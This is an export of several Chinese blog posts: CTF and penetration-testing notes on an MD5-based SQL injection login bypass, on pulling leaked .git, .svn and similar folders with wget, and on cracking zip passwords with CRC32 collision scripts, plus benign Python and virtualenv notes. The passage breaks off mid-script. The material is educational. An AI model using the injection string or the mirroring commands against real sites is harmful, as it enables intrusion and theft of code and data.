[{"title":"Jarvios OJ Writeup","date":"2017-11-04T03:23:21.000Z","path":"2017/11/04/jarviosoj-wp/","text":"$ which platform 0x00 前言Jarvios OJ 部分题目的writeup。 （不定期更。） 0x01 Web部分Login需要密码才能获得flag哦。 题目链接：http://web.jarvisoj.com:32772/ 在 Headers 里找到一条hint：1Hint:\"select * from `admin` where password='\".md5($pass,true).\"'\" 涉及到一个MD5加密后的注入问题。 关于这条md5语句我们先来看下php手册中的描述： Description string md5 ( string str [, bool raw_output] ) Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16. 注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE 也就是说，如果md5后的hex转换成字符串后，若包含 &#39;or&#39;&lt;trash&gt; 这样的字符串，那整个sql语句就会变成： 1SELECT * FROM admin WHERE pass = ''or'&lt;trash&gt;' 就可以进行注入了。 网上找到一个字符串：ffifdyop md5以后：276f722736c95d99e921722cf9ed621c 再转换成字符串即为&#39;or&#39;&lt;trash&gt; 这题把上面这个字符串作为 password 传入即可。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"writeup","slug":"writeup","permalink":"https://icyris.github.io/tags/writeup/"}]},{"title":"Web源码泄漏总结","date":"2017-10-27T13:35:15.000Z","path":"2017/10/27/code-leakage/","text":"源码泄漏的问题经常在一些渗透测试或者CTF中出现，这篇文章对一些常见的情况做了点整理XD。 如果有新的姿势也会不断更新～ 0x00 前言别看了这里没东西Σ(っ °Д °;)っ 大概是强迫症想加个前言∑(O_O；) 不过趁着放假还是说两句吧ᔪ꒰ ꒪ω꒪ |||꒱ 昨天带着小饼干跑去远远的地方搭帐篷玩耍了，很久前就买了的帐篷一直没地方用。带的东西不多，就一点零食，两只包。两个人，一片湖，一份太阳，一个下午。在包围苍天的小世界里很懒散地度过一段什么都不用去想的时间还是挺棒的。再过一小段时间一些杂事也就都清完了，花了一年的时间寻找方向，寻找方法，调理时间，接下来就去安安静静地大干一场吧。 幻界战线第二季开更啦，有生之年！是自己非常喜欢的一部番，做个小推荐吧⁽⁽٩( ´͈ ᗨ `͈ )۶⁾⁾ `` 好啦下面开始正题。 0x01 .hg源码泄漏Mercurial，一个版本管理软件。名字是水银的意思，所以用了hg（汞）的缩写。 它的用法和git有点类似，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台，不像git需要MinGW才得以运行，所以也有不少人喜欢用hg进行版本管理。 其泄漏内容主要包括： 项目代码 仓库地址 仓库用户名 漏洞成因在使用hg init初始化代码库的时候，会在当前目录下产生一个.hg的隐藏文件。 e.g. http://www.target.com/.hg 漏洞利用下载.hg文件：1wget -r --no-parent --mirror http://www.target.com/.hg 代码重构：1hg revert 利用工具 dvcs-ripper 0x02 .git源码泄漏在Github中被泄露的敏感信息主要包括以下几类： 邮箱信息 SVN信息 内部账号及密码 数据库连接信息 服务器配置信息 这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。 漏洞成因在运行git init初始化代码库的时候，会在当前目录下面产生一个名为.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 e.g. target.com/.git 漏洞利用下载.git文件1wget --mirror --include-directories=/.git http://www.target.com/.git 代码重构1git reset --hard 利用工具 dvcs-ripper（除了git还支持很多其他的版本管理系统） GitHack 0x03 .bzr文件泄漏Bazaar也是一个版本管理工具，不多说了。 漏洞成因在通过bzr init初始化项目时会在其根目录下产生名为.bzr的隐藏目录，同样能够暴露大量的源代码与用户信息。 漏洞利用下载.bzr文件：1wget -r --no-parent --mirror http://www.target.com/.bzr 回滚版本：1bzr revert 利用工具用上面提到的工具就可以。 0x04 .DS_Store文件泄漏.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在windows下类似的文件为desktop.ini。暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容，可以说是比较严重的泄露。 使用MacOS开发时，可以把.DS_Store加入忽略列表中（如.gitignore）, 但本质上其只是泄露目录结构, 就算删掉.DS_Store，文件也依然存在于Web服务器可以访问得到的地方，所以最根本的方法还是不要将敏感信息放在Web路径中。 漏洞成因在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用.DS_Store的格式为二进制，内部数据结构为Proprietary格式，可以自行解析并递归下载所有文件。 1http://www.target.com/.ds_store 利用工具 ds_store_exp 0x05 .svn文件泄漏SVN也是一个版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在git之前这也是一款比较热门的版本管理工具，但现在只有一些国企，研究院，或者比较早的项目仍在使用它进行代码管理。 在SVN中泄漏的内容主要包括： 项目的源代码 svn仓库地址 svn仓库所属用户的用户名 漏洞成因与git类似，svn在项目项目初始化时会在根目录下会创建一个.svn的隐藏文件夹，包含了所有分支commit信息和代码记录。 漏洞利用还是与git相似，先下载目录:1wget -r --no-parent --mirror http://www.target.com/.svn 然后进行版本回滚: 1svn revert --recursive . 利用工具 dvcs-ripper（同时支持旧版与新版的svn） Seay-Svn（一个基于windows平台的工具） 0x06 .CVS文件泄漏CVS是一个年代比较久远的版本控制系统，通过它可以追踪源代码的历史变化记录。但是因为功能比较简单，而且不支持分支，所以很早前就被上面提到的svn替代了。 因为是纯客户端的工具, 所以只会泄露源代码。 漏洞成因cvs项目在初始化(cvs checkout project)的时候，会在project目录下创建一个名为CVS的目录，其中保存了各个文件的修改和commit记录，通过此目录可以获取代码的历史版本。其中两个关键文件为：CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 漏洞利用下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理： 12wget -r --no-parent --mirror http://www.target.com/CVScvs diff * 利用工具 dvcs-ripper（啊没错又是这个） 0x07 备份文件备份文件泄露又分为两种情况： 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 1. Vim源码泄露如果发现页面有提示vi或者vim之类的，说明存在swp文件泄露，比如当前页面是/index.php，直接访问/.index.php.swp或者/index.php~，可以直接获得源码。 有的时候可能下载下来的文件是有一定的乱码。在linux下面执行vim -r index.php，可以恢复文件。 2. 常见漏洞检测12345678.rar.zip.7z.tar.gz.bak.swp.txt.html 0x08 WEB-INF/web.xml泄漏WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件。/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件。 漏洞成因通常一些Web应用我们会使用多个Web服务器搭配使用，解决其中的一个Web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 漏洞利用通过web.xml文件推测应用组件相关类的名字，然后在src目录下查找代码，如果没有源代码可以直接下载class文件反编译即可。 0x09 配置文件泄露现代Web开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。 漏洞利用通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好常见的配置文件路径，如wordpress的/wp-config.php等，组织成字典然后用脚本进行批量测试。 利用工具 参考字典 0x10 目录穿越目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致用户可以访问Web根目录的上级从而遍历服务器上的任意文件。 而Web服务器本身也曾经有类似的漏洞，比如Apache Tomcat的UTF-8解析漏洞，具体利用和绕过可以参考这篇文章，这里就不展开讲啦。 参考文章： https://zhuanlan.zhihu.com/p/21296806http://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"源码泄漏","slug":"源码泄漏","permalink":"https://icyris.github.io/tags/源码泄漏/"}]},{"title":"Python urllib2 学习笔记","date":"2017-10-26T03:17:52.000Z","path":"2017/10/26/urllib2/","text":"Python urllib2 模块学习笔记。 0x01 常见用法整理这部分纯搬运自：Lightless - Python urllib2 1. 通过 urllib2 获取网页内容123456789101112import urllib2response = urllib2.urlopen('http://www.baidu.com')html = response.read()print html# orimport urllib2req = urllib2.Request('http://www.baidu.com')response = urllib2.urlopen(req)the_page = response.read()print the_page 2. 发送POST请求12345678910import urllibimport urllib2url = 'http://www.someserver.com/register.cgi'values = &#123;'name' : 'WHY', 'location' : 'SDU', 'language' : 'Python' &#125;data = urllib.urlencode(values) # 编码工作req = urllib2.Request(url, data) # 发送请求同时传data表单response = urllib2.urlopen(req) # 接受反馈的信息the_page = response.read() # 读取反馈的内容 3. 发送GET请求12345678910111213141516import urllib2import urllibdata = &#123;&#125;data['name'] = 'WHY'data['location'] = 'SDU'data['language'] = 'Python'url_values = urllib.urlencode(data)print url_valuesname=Somebody+Here&amp;language=Python&amp;location=Northamptonurl = 'http://www.example.com/example.cgi'full_url = url + '?' + url_valuesdata = urllib2.open(full_url) 4. 设置 UApython 的默认 UA 是 python-urllib/x.y。 123456789101112131415import urllibimport urllib2url = 'http://www.someserver.com/cgi-bin/register.cgi'user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'values = &#123;'name' : 'WHY', 'location' : 'SDU', 'language' : 'Python' &#125;headers = &#123; 'User-Agent' : user_agent &#125;data = urllib.urlencode(values)req = urllib2.Request(url, data, headers)response = urllib2.urlopen(req)the_page = response.read() 5. URL ERROR12345import urllib2req = urllib2.Request('http://www.baibai.com')try: urllib2.urlopen(req)except urllib2.URLError, e: print e.reason 6. HTTP ERROR123456import urllib2req = urllib2.Request('http://lightless.me/a.php')try: urllib2.urlopen(req)except Exception, e: print e.code 7. 获取真实的 URL1234567import urllib2old_url = 'http://rrurl.cn/b1UZuP'req = Request(old_url)response = urlopen(req)print 'Old url: ' + old_urlprint 'Real url: ' + response.geturl() 8. 获取 Header 信息123456import urllib2old_url = 'http://www.baidu.com'req = Request(old_url)response = urlopen(req)print response.info() 9. Proxy 的设置默认情况下会使用环境变量 http_proxy 来设置代理。 12345678910import urllib2enable_proxy = Trueproxy_handler = urllib2.ProxyHandler(&#123;\"http\" : 'http://some-proxy.com:8080'&#125;)null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)if enable_proxy: opener = urllib2.build_opener(proxy_handler)else: opener = urllib2.build_opener(null_proxy_handler)urllib2.install_opener(opener) 10. Timeout 设置123456789# version &lt; 2.6import urllib2import socketsocket.setdefaulttimeout(10)urllib2.socket.setdefaulttimeout(10)# version &gt;= 2.6import urllib2response = urllib2.urlopen('http://www.google.com'， timeout=10) 11. 在 HTTP Requset 中增加指定的 Header12345import urllib2request = urllib2.Request('http://www.baidu.com/')request.add_header('User-Agent', 'fake-client')response = urllib2.urlopen(request)print response.read() 12. 打开 Debug log123456import urllib2httpHandler = urllib2.HTTPHandler(debuglevel=1)httpsHandler = urllib2.HTTPSHandler(debuglevel=1)opener = urllib2.build_opener(httpHandler, httpsHandler)urllib2.install_opener(opener)response = urllib2.urlopen('http://www.google.com')","tags":[{"name":"python","slug":"python","permalink":"https://icyris.github.io/tags/python/"},{"name":"Web Crawler","slug":"Web-Crawler","permalink":"https://icyris.github.io/tags/Web-Crawler/"}]},{"title":"Mac配置虚拟环境Virtualenv","date":"2017-10-20T17:15:41.000Z","path":"2017/10/21/python-venv/","text":"在Mac自带的Python环境下直接安装一些包时经常会遇到各种问题，也不太喜欢把原生的环境弄乱，就装了个虚拟环境，记录下留着日后用吧。 0x00 前言之前在写Flask的时候接触了Python的虚拟环境Virtualenv，它可以用来创建一个独立的Python运行环境，很干净，很便捷，搭配virtualenvwrapper（一个扩展包，可以更方便地管理虚拟环境）食用更佳。 0x01 安装 virtualenv1. 安装 virtualenv1$ sudo pip install virtualenv 2. 建立测试目录12$ mkdir testvirtual $ cd testvirtual 3. 创建虚拟环境 venv1$ virtualenv venv 0x02 安装 virtualenvwrapperVirtualenvwrapper是一个Virtualenv的扩展包，可以更方便地管理虚拟环境（新增、删除，启动等）。 1. 安装 Virtualenvwrapper默认安装在/usr/local/bin下面 1$ sudo easy_install virtualenvwrapper 2. 创建一个文件夹，用来存放所有虚拟环境12$ mkdir ~/Workspace$ cd ~/Workspace 3. 设置环境变量把下面两行代码写入~/.zshrc（这个根据自己的shell来写，比如如果你用的是bash，就在~/.bashrc中添加)。 12export WORKON_HOME=~/Workspacesource /usr/local/bin/virtualenvwrapper.sh 4. 使配置生效1$ source ./zshrc 5. 创建一个或多个虚拟环境12$ mkvirtualenv venv$ mkvirtualenv venv2 创建成功后路径前面就会有(venv)等字样。 0x03 常见操作命令一些基本操作命令： 1. 列出虚拟环境123$ workonvenvvenv3 或者用lsvirtualenv -b，效果一样。 2. 建立测试目录1$ workon venv 3. 查看环境里安装了哪些包1$ lssitepackages 4. 进入当前环境1$ cdvirtualenv 5. 进入当前环境的site-packages12$ cdsitepackages$ cdsitepackages pip 6. 复制虚拟环境12$ cpvirtualenv venv venv3Copying venv as venv3... 7. 退出虚拟环境1$ deactivate 8. 删除虚拟环境12$ rmvirtualenv venv2Removing venv2... 接下来安装Python的各种包就很顺利了。 0x04 纯白刻印做了对自觉挺好看的印章，刻了喜欢的句子，浅蓝色的纯白很棒。万事万物，喜欢最好。 冬天到啦，大家都要注意保暖呢。 参考文章： http://www.jianshu.com/p/51140800e8b4","tags":[{"name":"python","slug":"python","permalink":"https://icyris.github.io/tags/python/"},{"name":"Virtualenv","slug":"Virtualenv","permalink":"https://icyris.github.io/tags/Virtualenv/"}]},{"title":"给你压缩包却不给你密码的人到底在想什么","date":"2017-10-19T06:58:50.000Z","path":"2017/10/19/rar-attack/","text":"纯转载。原帖戳这里：veritas501 - 给你压缩包却不给你密码的人到底在想什么 0x00 开始在这里，我建议大家装两个解压软件，一个随意（我用的7z），一个是winrar。 嫌右键菜单挤你就装虚拟机里呗。 因为这两个压缩软件压缩出来的zip总是有点不同，最明显的一点，就是在已知明文攻击（后面会说）的时候，两种软件压缩出来的压缩包在构造明文压缩包的时候不能互用。 0x01 注释拿到压缩包上来一定要看有没有注释，一定要看有没有注释，一定要看有没有注释，重要的话说三遍。 有的时候他真的是想送你分，把密码或是hint写在注释里，但你就是不去看他一眼。 用hex方式打开的打一般在末尾 中文注释的话这样可能会乱码。建议压缩软件打开 0x02 弱密码这个其实真的没什么好说的，上来应该先试一试的，因为也不用动脑子，直接放后台跑就行了。 首先先跑纯数字密码，1到9位直接跑一遍，也就1分钟左右的时间吧。 不对的话可以上字典，或是短密码穷举一下，直接丢后台就行，人脑可以再做其他的方向的分析。 另外，如果跑字典都跑不到的话，可以试试此次CTF的名字，或是这个题目的名字。 软件用archpr，网上直接下就行，这里就不分享了。 0x03 压缩包伪加密一个伪加密的压缩包冒充加密压缩包，你要知道压缩软件是如何识别一个压缩包是否被加密的。 软件主要是围绕frFlags和deFlags来判断的。 我们用winrar创建一个加密的压缩包，可以看到加密的压缩包的frFlags和deFlags都为9。 其中，deFlags是针对单个文件的，压缩包中的每个文件都有。 而未加密的都为0。 用7z创建一个加密的压缩包，frFlags和deFlags都为1。这里就不多放图了。 而未加密的依然都为0。 综上，大家应该已经知道怎么改标志位来构造伪加密以及如何搞定伪加密了。（这里添一句，mac OS可以直接打开伪加密的压缩包。） 0x04 已知明文攻击一种比较巧妙的攻击方法，首先你需要一个压缩包中已知的文件(文件大小大于12bytes)，比如readme.txt 12345├─enc.zip│ ├─flag.txt *│ └─readme.txt *│└─readme.txt 这样我们就可以构造明文zip 12├─plaintext.zip│ └─readme.txt 原理大概是压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件反推加密密钥，利用密钥来解密其他加密文件。 划重点：构造明文压缩包时要选用与加密压缩包相同的压缩软件，如果他用winrar压的，你用7z构造出的压缩包来做明文压缩包，软件是会报错的。 这样就是还原出密钥了，点OK后软件会叫你保存解密后的压缩包。 0x05 CRC碰撞CRC32碰撞用于非常小的文件（6字节以上基本就别试了），就是通过CRC来反推文件内容。 而且CRC32是很容易碰撞的，所以就6字节而言，同一个CRC32可能对应着十几个字符串（纯可视字符）。 当文件刚好是6字节时，使用下面的crc32.py脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307#!/usr/bin/env python# CRC32 tools by Victor#usage: python crc32.py reverse 0xffffffff（the crc）import argparseimport osimport syspermitted_characters = set( map(ord, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_')) # \\wtesting = Falseargs = Nonedef get_poly(): poly = parse_dword(args.poly) if args.msb: poly = reverseBits(poly) check32(poly) return polydef get_input(): if args.instr: return tuple(map(ord, args.instr)) with args.infile as f: # pragma: no cover return tuple(map(ord, f.read()))def out(msg): if not testing: # pragma: no cover args.outfile.write(msg) args.outfile.write(os.linesep)table = []table_reverse = []def init_tables(poly, reverse=True): global table, table_reverse table = [] # build CRC32 table for i in range(256): for j in range(8): if i &amp; 1: i &gt;&gt;= 1 i ^= poly else: i &gt;&gt;= 1 table.append(i) assert len(table) == 256, \"table is wrong size\" # build reverse table if reverse: table_reverse = [] found_none = set() found_multiple = set() for i in range(256): found = [] for j in range(256): if table[j] &gt;&gt; 24 == i: found.append(j) table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) &gt; 1: found_multiple.add(i) assert len(table_reverse) == 256, \"reverse table is wrong size\" if found_multiple: out('WARNING: Multiple table entries have an MSB in &#123;0&#125;'.format( rangess(found_multiple))) if found_none: out('ERROR: no MSB in the table equals bytes in &#123;0&#125;'.format( rangess(found_none)))def calc(data, accum=0): accum = ~accum for b in data: accum = table[(accum ^ b) &amp; 0xFF] ^ ((accum &gt;&gt; 8) &amp; 0x00FFFFFF) accum = ~accum return accum &amp; 0xFFFFFFFFdef rewind(accum, data): if not data: return (accum,) stack = [(len(data), ~accum)] solutions = set() while stack: node = stack.pop() prev_offset = node[0] - 1 for i in table_reverse[(node[1] &gt;&gt; 24) &amp; 0xFF]: prevCRC = (((node[1] ^ table[i]) &lt;&lt; 8) | (i ^ data[prev_offset])) &amp; 0xFFFFFFFF if prev_offset: stack.append((prev_offset, prevCRC)) else: solutions.add((~prevCRC) &amp; 0xFFFFFFFF) return solutionsdef findReverse(desired, accum): solutions = set() accum = ~accum stack = [(~desired,)] while stack: node = stack.pop() for j in table_reverse[(node[0] &gt;&gt; 24) &amp; 0xFF]: if len(node) == 4: a = accum data = [] node = node[1:] + (j,) for i in range(3, -1, -1): data.append((a ^ node[i]) &amp; 0xFF) a &gt;&gt;= 8 a ^= table[node[i]] solutions.add(tuple(data)) else: stack.append(((node[0] ^ table[j]) &lt;&lt; 8,) + node[1:] + (j,)) return solutions# Toolsdef parse_dword(x): return int(x, 0) &amp; 0xFFFFFFFFdef reverseBits(x): # http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel # http://stackoverflow.com/a/20918545 x = ((x &amp; 0x55555555) &lt;&lt; 1) | ((x &amp; 0xAAAAAAAA) &gt;&gt; 1) x = ((x &amp; 0x33333333) &lt;&lt; 2) | ((x &amp; 0xCCCCCCCC) &gt;&gt; 2) x = ((x &amp; 0x0F0F0F0F) &lt;&lt; 4) | ((x &amp; 0xF0F0F0F0) &gt;&gt; 4) x = ((x &amp; 0x00FF00FF) &lt;&lt; 8) | ((x &amp; 0xFF00FF00) &gt;&gt; 8) x = ((x &amp; 0x0000FFFF) &lt;&lt; 16) | ((x &amp; 0xFFFF0000) &gt;&gt; 16) return x &amp; 0xFFFFFFFF# Compatibility with Python 2.6 and earlier.if hasattr(int, \"bit_length\"): def bit_length(num): return num.bit_length()else: def bit_length(n): if n == 0: return 0 bits = -32 m = 0 while n: m = n n &gt;&gt;= 32 bits += 32 while m: m &gt;&gt;= 1 bits += 1 return bitsdef check32(poly): if poly &amp; 0x80000000 == 0: out('WARNING: polynomial degree (&#123;0&#125;) != 32'.format(bit_length(poly))) out(' instead, try') out(' 0x&#123;0:08x&#125; (reversed/lsbit-first)'.format(poly | 0x80000000)) out(' 0x&#123;0:08x&#125; (normal/msbit-first)'.format(reverseBits(poly | 0x80000000)))def reciprocal(poly): ''' Return the reversed reciprocal (Koopman notatation) polynomial of a reversed (lsbit-first) polynomial ''' return reverseBits((poly &lt;&lt; 1) | 1)def print_num(num): ''' Write a numeric result in various forms ''' out('hex: 0x&#123;0:08x&#125;'.format(num)) out('dec: &#123;0:d&#125;'.format(num)) out('oct: 0o&#123;0:011o&#125;'.format(num)) out('bin: 0b&#123;0:032b&#125;'.format(num))import itertoolsdef ranges(i): for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]): g = list(kg[1]) yield g[0][1], g[-1][1]def rangess(i): return ', '.join(map(lambda x: '[&#123;0&#125;,&#123;1&#125;]'.format(*x), ranges(i)))# Parsersdef get_parser(): ''' Return the command-line parser ''' parser = argparse.ArgumentParser( description=\"Reverse, undo, and calculate CRC32 checksums\") subparsers = parser.add_subparsers(metavar='action') poly_flip_parser = argparse.ArgumentParser(add_help=False) subparser_group = poly_flip_parser.add_mutually_exclusive_group() subparser_group.add_argument( '-m', '--msbit', dest=\"msb\", action='store_true', help='treat the polynomial as normal (msbit-first)') subparser_group.add_argument('-l', '--lsbit', action='store_false', help='treat the polynomial as reversed (lsbit-first) [default]') desired_poly_parser = argparse.ArgumentParser(add_help=False) desired_poly_parser.add_argument( 'desired', type=str, help='[int] desired checksum') default_poly_parser = argparse.ArgumentParser(add_help=False) default_poly_parser.add_argument( 'poly', default='0xEDB88320', type=str, nargs='?', help='[int] polynomial [default: 0xEDB88320]') accum_parser = argparse.ArgumentParser(add_help=False) accum_parser.add_argument( 'accum', type=str, help='[int] accumulator (final checksum)') default_accum_parser = argparse.ArgumentParser(add_help=False) default_accum_parser.add_argument( 'accum', default='0', type=str, nargs='?', help='[int] starting accumulator [default: 0]') outfile_parser = argparse.ArgumentParser(add_help=False) outfile_parser.add_argument('-o', '--outfile', metavar=\"f\", type=argparse.FileType('w'), default=sys.stdout, help=\"Output to a file instead of stdout\") infile_parser = argparse.ArgumentParser(add_help=False) subparser_group = infile_parser.add_mutually_exclusive_group() subparser_group.add_argument('-i', '--infile', metavar=\"f\", type=argparse.FileType('rb'), default=sys.stdin, help=\"Input from a file instead of stdin\") subparser_group.add_argument('-s', '--str', metavar=\"s\", type=str, default='', dest='instr', help=\"Use a string as input\") subparser = subparsers.add_parser('flip', parents=[outfile_parser], help=\"flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa\") subparser.add_argument('poly', type=str, help='[int] polynomial') subparser.set_defaults( func=lambda: print_num(reverseBits(parse_dword(args.poly)))) subparser = subparsers.add_parser('reciprocal', parents=[outfile_parser], help=\"find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa\") subparser.add_argument('poly', type=str, help='[int] polynomial') subparser.set_defaults(func=reciprocal_callback) subparser = subparsers.add_parser('table', parents=[outfile_parser, poly_flip_parser, default_poly_parser], help=\"generate a lookup table for a polynomial\") subparser.set_defaults(func=table_callback) subparser = subparsers.add_parser('reverse', parents=[ outfile_parser, poly_flip_parser, desired_poly_parser, default_accum_parser, default_poly_parser], help=\"find a patch that causes the CRC32 checksum to become a desired value\") subparser.set_defaults(func=reverse_callback) subparser = subparsers.add_parser('undo', parents=[ outfile_parser, poly_flip_parser, accum_parser, default_poly_parser, infile_parser], help=\"rewind a CRC32 checksum\") subparser.add_argument('-n', '--len', metavar='l', type=str, default='0', help='[int] number of bytes to rewind [default: 0]') subparser.set_defaults(func=undo_callback) subparser = subparsers.add_parser('calc', parents=[ outfile_parser, poly_flip_parser, default_accum_parser, default_poly_parser, infile_parser], help=\"calculate the CRC32 checksum\") subparser.set_defaults(func=calc_callback) return parserdef reciprocal_callback(): poly = parse_dword(args.poly) check32(poly) print_num(reciprocal(poly))def table_callback(): # initialize tables init_tables(get_poly(), False) # print table out('[&#123;0&#125;]'.format(', '.join(map('0x&#123;0:08x&#125;'.format, table))))def reverse_callback(): # initialize tables init_tables(get_poly()) # find reverse bytes desired = parse_dword(args.desired) accum = parse_dword(args.accum) # 4-byte patch patches = findReverse(desired, accum) for patch in patches: out('4 bytes: &#123;&#123;0x&#123;0:02x&#125;, 0x&#123;1:02x&#125;, 0x&#123;2:02x&#125;, 0x&#123;3:02x&#125;&#125;&#125;'.format(*patch)) checksum = calc(patch, accum) out('verification checksum: 0x&#123;0:08x&#125; (&#123;1&#125;)'.format( checksum, 'OK' if checksum == desired else 'ERROR')) # 6-byte alphanumeric patches for i in permitted_characters: for j in permitted_characters: patch = [i, j] patches = findReverse(desired, calc(patch, accum)) for last_4_bytes in patches: if all(p in permitted_characters for p in last_4_bytes): patch.extend(last_4_bytes) out('alternative: &#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125; (&#123;0&#125;)'.format( 'OK' if calc(patch, accum) == desired else 'ERROR', *map(chr, patch)))def undo_callback(): # initialize tables init_tables(get_poly()) # calculate checksum accum = parse_dword(args.accum) maxlen = int(args.len, 0) data = get_input() if not 0 &lt; maxlen &lt;= len(data): maxlen = len(data) out('rewinded &#123;0&#125;/&#123;1&#125; (&#123;2:.2f&#125;%)'.format(maxlen, len(data), maxlen * 100.0 / len(data) if len(data) else 100)) for solution in rewind(accum, data[-maxlen:]): out('') print_num(solution)def calc_callback(): # initialize tables init_tables(get_poly(), False) # calculate checksum accum = parse_dword(args.accum) data = get_input() out('data len: &#123;0&#125;'.format(len(data))) out('') print_num(calc(data, accum))def main(argv=None): ''' Runs the program and handles command line options ''' parser = get_parser() # Parse arguments and run the function global args args = parser.parse_args(argv) args.func()if __name__ == '__main__': main() # pragma: no cover 示例： 当字节数小于6时，用下面的crack.py脚本（用python3）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#!/usr/bin/env python3import sysimport osimport stringimport collectionsimport argparseparser = argparse.ArgumentParser()parser.add_argument('file', nargs='*')parser.add_argument('--hex', action='append')parser.add_argument('--dec', action='append')parser.add_argument('--limit', type=int)parser.add_argument('--compiler', default='g++')parser.add_argument('--alphabet', type=os.fsencode, default=string.printable.encode())args = parser.parse_args()targets = collections.OrderedDict()limit = 0crcs = []if args.limit: limit = max(limit, args.limit)if args.hex or args.dec: if not args.limit: parser.error('Limit of length not specified')if args.hex: for s in args.hex: crc = int(s, 16) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )]if args.dec: for s in args.dec: crc = int(s) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )]if args.file: print('reading zip files...', file=sys.stderr) import zipfile for zipname in args.file: fh = zipfile.ZipFile(zipname) for info in fh.infolist(): targets['%s / %s' % ( zipname, info.filename )] = ( info.CRC, info.file_size ) crcs += [( info.CRC, info.file_size )] limit = max(limit, info.file_size) print('file found: %s / %s: crc = 0x%08x, size = %d' % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr)if not crcs: parser.error('No CRCs given')# compiling c++ in python script is the easy way to have the both a good interface and better speedcode = ''code += r'''#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;set&gt;#include &lt;cstdint&gt;#include &lt;cctype&gt;#define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i))using namespace std;uint32_t crc_table[256];void make_crc_table() &#123; repeat (i, 256) &#123; uint32_t c = i; repeat (j, 8) &#123; c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1); &#125; crc_table[i] = c; &#125;&#125;const uint32_t initial_crc32 = 0xffffffff;uint32_t next_crc32(uint32_t c, char b) &#123; return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8);&#125;const uint32_t mask_crc32 = 0xffffffff;const char alphabet[] = &#123; ''' + ', '.join(map(str, args.alphabet)) + r''' &#125;;const int limit = ''' + str(limit) + 